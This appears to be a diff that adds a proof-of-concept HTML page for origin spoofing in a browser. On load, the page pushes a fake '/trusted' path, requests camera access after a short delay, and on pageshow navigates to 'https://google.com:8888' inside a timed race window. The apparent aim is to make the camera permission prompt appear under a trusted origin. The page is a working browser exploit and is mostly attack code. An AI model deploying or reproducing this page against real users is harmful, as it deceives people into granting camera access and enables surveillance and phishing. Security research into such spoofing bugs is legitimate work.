@@ -1,0 +1,105 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Origin Spoofing - Camera</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <style>
+      body {
+        margin: 0;
+        font-family: -apple-system, BlinkMacSystemFont, system-ui;
+        background: #f5f5f7;
+      }
+      button {
+        font-size: 15px;
+        padding: 10px 14px;
+        border-radius: 10px;
+        border: none;
+        background: #007aff;
+        color: #fff;
+        display: none;
+      }
+      #panel {
+        display: none;
+        max-width: 420px;
+        margin: 80px auto;
+        background: #fff;
+        padding: 24px;
+        border-radius: 16px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
+        text-align: center;
+      }
+      .notice {
+        margin-top: 14px;
+        font-size: 13px;
+        color: #b00020;
+      }
+      video {
+        width: 100%;
+        max-width: 300px;
+        margin-top: 10px;
+        border-radius: 8px;
+        background: #000;
+      }
+    </style>
+  </head>
+  <body>
+    <div style="text-align: center; margin-top: 60px">
+      <button id="trigger">Click Here</button>
+    </div>
+
+    <div id="panel">
+      <h2>Request Camera Access</h2>
+      <p>Tap the button below to request Camera permission.</p>
+      <button onclick="getCamera()">Open Camera</button>
+      <div id="video-container">
+        <video id="video" autoplay playsinline></video>
+      </div>
+      <p id="output">Status: -</p>
+      <div class="notice">CAPTURED</div>
+    </div>
+
+    <script>
+      const panel = document.getElementById("panel");
+      const output = document.getElementById("output");
+      const video = document.getElementById("video");
+
+      function getCamera() {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          output.textContent = "getUserMedia not supported";
+          return;
+        }
+        
+        // Meminta izin akses kamera video saja
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+          .then((stream) => {
+            output.textContent = "Camera access granted";
+            video.srcObject = stream;
+          })
+          .catch((err) => {
+            output.textContent = `Permission denied: ${err.message}`;
+          });
+      }
+
+      window.onload = () => {
+        history.pushState({}, "", "/trusted");
+        panel.style.display = "block";
+
+        // Memicu fungsi kamera dalam jendela race condition
+        setTimeout(() => {
+          getCamera();
+        }, 500);
+      };
+
+      window.addEventListener("pageshow", () => {
+        requestAnimationFrame(() => {
+          requestAnimationFrame(() => {
+            setTimeout(() => {
+              location.href = "https://google.com:8888";
+            }, 80);
+          });
+        });
+      });
+    </script>
+  </body>
+</html>
